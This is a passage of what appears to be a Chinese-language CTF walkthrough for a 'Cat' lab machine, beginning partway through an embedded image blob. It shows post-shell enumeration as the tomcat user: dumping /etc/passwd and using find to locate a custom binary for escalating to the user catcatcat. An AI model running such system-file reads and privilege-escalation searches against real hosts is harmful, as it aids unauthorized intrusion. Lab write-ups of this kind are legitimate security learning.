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"></p>
+<p>获取到shell之后就是找突破点提权到普通用户shell上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">tomcat@Cat:/tmp$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi                       n</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbi                       n/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/n                       ologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">tomcat:x:1001:998::/opt/tomcat:/bin/false</span><br><span class="line">catcatcat:x:1000:1000:,,,:/home/catcatcat:/bin/bash</span><br><span class="line">dog:x:1002:1001:,,,:/home/dog:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后这个靶机的话其实额，这个tomcat的shell的话不是很好用，emm，但是配合一下less或者more命令勉强可以。</p>
+<p>tomcat—&gt;catcatcat</p>
+<p>这里我一开始的思路就是看一下有没有suid权限的文件或者说什么系统本身的漏洞，或者作者放了什么提权的文件在某个目录下，然后我有去尝试了内核漏洞，但是似乎是权限不够的问题导致copy fail不起效果。</p>
+<p>然后就这样摸着摸着一天了，啥都没找到，说实话复盘的时候发现我这种方法挺死板的。其实突破口在&#x2F;usr&#x2F;local&#x2F;bin目录下面，这个目录是用来存储我们用户额外添加的二进制文件目录，所以如果一个靶机上其他方法都尝试过了，可以来这里看一下，可能会有所发现。这里我在后面复盘的时候是这样想的，如果一个靶机没有线索之后，可以从普通用户（提权目标）的名称来入手，这里的一个用户名字叫做catcatcat然后靶机其实也叫做cat，所以我们在这里可以搜&#x2F;usr目录下有没有什么相关的二进制文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">tomcat@Cat:/tmp$ find /usr/bin -iname <span class="string">&quot;*cat*&quot;</span> 2&gt;/dev/null</span><br><span class="line">/usr/bin/shmidcat</span><br><span class="line">/usr/bin/gapplication</span><br><span class="line">/usr/bin/fc-cat</span><br><span class="line">/usr/bin/bzcat</span><br><span class="line">/usr/bin/zcat</span><br><span class="line">/usr/bin/catchsegv</span><br><span class="line">/usr/bin/gencat</span><br><span class="line">/usr/bin/lzcat</span><br><span class="line">/usr/bin/xzcat</span><br><span class="line">/usr/bin/bdftruncate</span><br><span class="line">/usr/bin/systemd-cat</span><br><span class="line">/usr/bin/cat</span><br><span class="line">/usr/bin/precat</span><br><span class="line">/usr/bin/fallocate</span><br><span class="line">/usr/bin/truncate</span><br><span class="line">/usr/bin/debconf-communicate</span><br><span class="line">/usr/bin/imgcat</span><br><span class="line">tomcat@Cat:/tmp$ find /usr/local -iname <span class="string">&quot;*cat*&quot;</span> 2&gt;/dev/null</span><br><span class="line">/usr/local/bin/catcatcat</span><br><span class="line">/usr/local/lib/python3.9/dist-packages/pytz/zoneinfo/Asia/Muscat</span><br><span class="line">/usr/local/lib/python3.9/dist-packages/pytz/zoneinfo/America/Argentina/Catamarca</span><br><span class="line">/usr/local/lib/python3.9/dist-packages/pytz/zoneinfo/America/Catamarca</span><br><span class="line">/usr/local/share/ca-certificates</span><br></pre></td></tr></table></figure>
+
+<p>然后你可以那这些结果去丢给ai分析，emm提示词的话大概就是说根据官方的一些资料来判断这些工具的作用，不要编。然后大概会给你这些信息</p>
